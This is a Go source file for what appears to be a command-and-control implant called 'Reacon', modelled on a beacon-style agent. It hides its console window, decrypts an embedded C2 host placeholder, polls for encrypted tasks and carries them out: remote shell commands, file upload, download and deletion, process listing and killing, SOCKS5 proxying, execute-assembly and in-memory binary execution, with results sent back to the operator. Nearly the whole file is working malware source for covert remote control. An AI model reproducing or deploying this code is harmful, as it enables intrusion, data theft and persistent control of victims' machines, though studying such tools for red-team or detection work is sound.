package main

import (
	"Reacon/pkg/communication"
	"Reacon/pkg/config"
	"Reacon/pkg/encrypt"
	"Reacon/pkg/services"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"sort"
	"strings"
	"time"
)

func process_client(name string) {
	data := communication.Get(communication.Service, name)
	communication.Del(communication.Service, name)
	if data != nil {
		totalLen := len(data)
		if totalLen > 0 {
			rawData, err := encrypt.DecodeBase64(data)
			if err != nil {
				fmt.Println(err)
			}
			data, err = encrypt.Decrypt(rawData)
			if err != nil {
				fmt.Println(err)
			}
			decrypted, err := encrypt.Decrypt(data)
			if err != nil {
				communication.ErrorProcess(err)
				fmt.Println(err)
			}
			if len(decrypted) < 4 {
				return
			}
			cmdType := binary.BigEndian.Uint32(decrypted[:4])
			cmdBuf := decrypted[4:]
			if cmdBuf != nil {
				var err error
				var callbackType int
				var result []byte
				switch cmdType {
				case services.SHELL: // shell
					result, err = services.CmdShell(cmdBuf)
					callbackType = 0
				case services.UploadStart: //upload 第一次
					result, err = services.CmdUpload(cmdBuf, true)
					callbackType = 0
				case services.UploadLoop: //upload 后续的upload
					result, err = services.CmdUpload(cmdBuf, false)
					callbackType = 0
				case services.DOWNLOAD: //download   2
					result, err = services.CmdDownload(cmdBuf)
					callbackType = 0
				case services.FileBrowse: //File Browser
					result, err = services.CmdFileBrowse(cmdBuf)
					callbackType = services.FileBrowse
				case services.CD: //cd
					result, err = services.CmdCd(cmdBuf)
					callbackType = 0
				case services.SLEEP: //sleep
					result, err = services.CmdSleep(cmdBuf)
					callbackType = 0
				case services.PAUSE: //pause
					result, err = services.CmdPause(cmdBuf)
					callbackType = 0
				case services.PWD: //pwd
					result, err = services.CmdPwd()
					callbackType = 0
				case services.EXIT: //exit
					result, err = services.CmdExit()
					if err == nil {
						os.Exit(1)
					}
					callbackType = 0
				case services.EXECUTE: // windows 后台执行程序
					result, err = services.CmdExecute(cmdBuf)
					callbackType = 0
				case services.PS: // ps 列出进程
					result, err = services.CmdPs()
					callbackType = services.PS
				case services.KILL: //kill
					result, err = services.CmdKill(cmdBuf)
					callbackType = 0
				case services.MKDIR: //mkdir
					result, err = services.CmdMkdir(cmdBuf)
					callbackType = 0
				case services.DRIVES: //list drives  2
					result, err = services.CmdDrives()
					callbackType = services.DRIVES
				case services.RM: //rm
					result, err = services.CmdRm(cmdBuf)
					callbackType = 0
				case services.CP: //cp
					result, err = services.CmdCp(cmdBuf)
					callbackType = 0
				case services.MV: //mv
					result, err = services.CmdMv(cmdBuf)
					callbackType = 0
				case services.FileContent:
					result, err = services.GetFileContent(cmdBuf)
					callbackType = 0
				case services.Scoks5Start:
					result, err = services.SocksConnect(cmdBuf)
					callbackType = 0
				case services.Scoks5Close:
					result, err = services.SocksClose()
					callbackType = 0
				case services.ExecuteAssembly:
					result, err = services.Execute_Assembly(cmdBuf)
					callbackType = 0
				case services.InlineBin:
					result, err = services.Inline_bin(cmdBuf)
					callbackType = 0
				default:
					err = errors.New("not supported command")
				}
				// convert charset here
				if err != nil {
					communication.ErrorProcess(err)
				} else {
					if callbackType >= 0 {
						communication.DataProcess(callbackType, result)
					}
				}
			}
		}
	}

}

func Run_main(host string) {

	tmp := strings.Split(host, ":")
	communication.InitClient(tmp[0], tmp[1], tmp[2], tmp[3])

	for {
		time.Sleep(1 * time.Second)
		var keys []string
		for _, c2 := range communication.List(communication.Service) {
			if strings.Contains(c2.Key, "server") {
				keys = append(keys, c2.Key)
			}
		}

		// 2. 按时间戳排序
		sort.Slice(keys, func(i, j int) bool {
			return keys[i] < keys[j] // 字符串直接按字典序比较（因为时间戳格式是递增的）
		})

		// 3. 顺序处理
		for _, key := range keys {
			process_client(key) // 不用 `go`，保证按顺序执行
		}
		//for _, c2 := range communication.List(communication.Service) {
		//	fmt.Println("received data:", c2.Key)
		//	if strings.Contains(c2.Key, utils.Uid+"/server") {
		//		go process_client(c2.Key)
		//	}
		//}
	}
}

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}
	errConsole := services.HideConsole()
	if errConsole != nil && errConsole.Error() != "" {
		fmt.Println(errConsole)
	}
	// windows 下设置不需要DPI缩放
	errDPI := services.ProcessDPIAware()
	if errDPI != nil && errDPI.Error() != "" {
		fmt.Println(errDPI)
	}

	encryptedHost := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	encryptedHost = strings.ReplaceAll(encryptedHost, " ", "")
	tmp1, _ := encrypt.DecodeBase64([]byte(encryptedHost))
	tmp2, _ := encrypt.Decrypt(tmp1)
	host := string(tmp2)

	Run_main(host)
}
